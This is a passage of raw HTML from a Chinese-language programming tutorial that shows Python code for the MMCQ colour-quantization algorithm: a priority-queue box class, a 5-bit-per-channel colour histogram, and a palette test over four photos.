crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfrom queue import PriorityQueue as PQueue\r\n\r\nclass VBox(object):\r\n  def __init__(self, r1, r2, g1, g2, b1, b2, histo):\r\n    self.vol = calV()\r\n    self.npixs = calN()\r\n    self.priority = self.npixs * -1 # PQueue 是按优先级自小到大排序\r\n\r\nboxQueue.put((vbox0.priority, vbox0))\r\n\r\nvbox.priority *= vbox.vol\r\nboxQueue.put((vbox0.priority, vbox0))</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67035440d664578184-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67035440d664578184-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab67035440d664578184-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67035440d664578184-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab67035440d664578184-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67035440d664578184-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab67035440d664578184-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67035440d664578184-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab67035440d664578184-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67035440d664578184-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab67035440d664578184-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67035440d664578184-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67035440d664578184-1\"><span class=\"crayon-e\">from </span><span class=\"crayon-e\">queue </span><span class=\"crayon-e\">import </span><span class=\"crayon-e\">PriorityQueue </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">PQueue</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67035440d664578184-2\"> </div><div class=\"crayon-line\" id=\"crayon-5bab67035440d664578184-3\"><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">VBox</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67035440d664578184-4\"><span class=\"crayon-h\">  </span><span class=\"crayon-e\">def </span><span class=\"crayon-e\">__init__</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">g1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">g2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">b1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">b2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">histo</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab67035440d664578184-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">vol</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">calV</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67035440d664578184-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">npixs</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">calN</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab67035440d664578184-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">priority</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e \">npixs *</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># PQueue 是按优先级自小到大排序</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67035440d664578184-8\"> </div><div class=\"crayon-line\" id=\"crayon-5bab67035440d664578184-9\"><span class=\"crayon-v\">boxQueue</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">put</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">vbox0</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">priority</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">vbox0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67035440d664578184-10\"> </div><div class=\"crayon-line\" id=\"crayon-5bab67035440d664578184-11\"><span class=\"crayon-v\">vbox</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e \">priority *</span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">vbox</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">vol</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67035440d664578184-12\"><span class=\"crayon-v\">boxQueue</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">put</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">vbox0</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">priority</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">vbox0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0026 seconds] -->\r\n\n</div>\n<p>除此之外，算法中最重要的部分是统计色彩分布直方图。我们需要将三维空间中的任意一点对应到一维坐标中的整数，这样才能以最快地速度定位这一颜色。如果采用全部的24位信息，那么我们用于保存直方图的数组长度至少要是$2^{24}=16777216$，既然是要提取颜色主题（或是颜色量化），我们可以将颜色由RGB各8位压缩至5位，这样数组长度只有$2^{15}=32768$：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670354416925268334\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef getColorIndex(self, r, g, b):\r\n    return (r &lt;&lt; (2 * self.SIGBITS)) + (g &lt;&lt; self.SIGBITS) + b\r\ndef getPixHisto(self):\r\n    pixHisto = np.zeros(1 &lt;&lt; (3 * self.SIGBITS))\r\n    for y in range(self.h):\r\n        for x in range(self.w):\r\n            r = self.pixData[y, x, 0] &gt;&gt; self.rshift\r\n            g = self.pixData[y, x, 1] &gt;&gt; self.rshift\r\n            b = self.pixData[y, x, 2] &gt;&gt; self.rshift\r\n\r\n            pixHisto[self.getColorIndex(r, g, b)] += 1\r\n    return pixHisto</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670354416925268334-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670354416925268334-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670354416925268334-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670354416925268334-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670354416925268334-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670354416925268334-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670354416925268334-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670354416925268334-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670354416925268334-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670354416925268334-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab670354416925268334-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670354416925268334-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670354416925268334-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">getColorIndex</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">g</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">b</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670354416925268334-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">r</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">SIGBITS</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">g</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">SIGBITS</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">b</span></div><div class=\"crayon-line\" id=\"crayon-5bab670354416925268334-3\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">getPixHisto</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670354416925268334-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">pixHisto</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">np</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">zeros</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">SIGBITS</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab670354416925268334-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">y</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">h</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670354416925268334-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">w</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab670354416925268334-7\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">r</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">pixData</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">rshift</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670354416925268334-8\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">g</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">pixData</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">rshift</span></div><div class=\"crayon-line\" id=\"crayon-5bab670354416925268334-9\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">b</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">pixData</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">rshift</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670354416925268334-10\"> </div><div class=\"crayon-line\" id=\"crayon-5bab670354416925268334-11\"><span class=\"crayon-e\">            </span><span class=\"crayon-v\">pixHisto</span><span class=\"crayon-sy\">[</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getColorIndex</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">g</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">b</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670354416925268334-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pixHisto</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0041 seconds] -->\r\n\n</div>\n<p>分别对4张图片进行切分、提取：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67035441a061231005\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef testMMCQ(pixDatas, maxColor):\r\n    start  = time.process_time()\r\n    themes = list(map(lambda d: MMCQ(d, maxColor).quantize(), pixDatas))\r\n    print(\"MMCQ Time cost: {0}\".format(time.process_time() - start))\r\n    return themes\r\nimgs = map(lambda i: 'imgs/photo%s.jpg' % i, range(1,5))\r\npixDatas = list(map(getPixData, imgs))\r\nmaxColor = 7\r\n\r\nthemes = [testMMCQ(pixDatas, maxColor)]\r\nimgPalette(pixDatas, themes, [\"MMCQ Palette\"])</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67035441a061231005-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67035441a061231005-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab67035441a061231005-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67035441a061231005-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab67035441a061231005-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67035441a061231005-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab67035441a061231005-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67035441a061231005-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab67035441a061231005-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67035441a061231005-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab67035441a061231005-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67035441a061231005-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">testMMCQ</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pixDatas</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">maxColor</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67035441a061231005-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">start</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">time</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">process_time</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab67035441a061231005-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">themes</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">list</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">map</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">lambda</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">d</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">MMCQ</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">d</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">maxColor</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">quantize</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pixDatas</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67035441a061231005-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">print</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"MMCQ Time cost: {0}\"</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">format</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">time</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">process_time</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">start</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab67035441a061231005-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">themes</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67035441a061231005-6\"><span class=\"crayon-v\">imgs</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">map</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">lambda</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'imgs/photo%s.jpg'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab67035441a061231005-7\"><span class=\"crayon-v\">pixDatas</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">list</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">map</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">getPixData</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">imgs</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67035441a061231005-8\"><span class=\"crayon-v\">maxColor</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span></div><div class=\"crayon-line\" id=\"crayon-5bab67035441a061231005-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67035441a061231005-10\"><span class=\"crayon-v\">themes</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">testMMCQ</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pixDatas</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">maxColor</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5bab67035441a061231005-11\"><span class=\"crayon-e\">imgPalette</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pixDatas</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">themes</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">\"MMCQ Palette\"</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0031 seconds] -->\r\n\n</div>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/0d6435cf3a6c89279652bacc6fcdf95e.png\" alt=\"mmcq\"></p>\n<h2><strong>1.2. 八叉树算法（Octree）</strong></h2>\n<p>八叉树算法的原理可以参考这篇文章：<a 